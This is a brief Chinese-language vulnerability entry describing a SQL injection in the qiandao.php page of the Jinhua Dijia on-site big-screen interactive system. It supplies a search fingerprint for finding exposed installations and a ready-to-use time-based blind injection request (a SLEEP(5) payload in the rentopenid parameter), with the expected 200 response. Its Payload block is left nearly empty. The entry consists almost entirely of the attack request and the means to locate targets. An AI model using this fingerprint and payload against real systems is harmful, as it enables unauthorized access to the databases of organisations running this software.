# 金华迪加现场大屏互动系统qiandao.php存在SQL注入漏洞

金华迪加现场大屏互动系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/wall/themes/meepo/assets/images/defaultbg.jpg"`
- **请求**：`GET /mobile/qiandao.php?rentopenid=1"+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)--+ HTTP/1.1`

**Payload**
```
Host：
```
- **响应特征**：200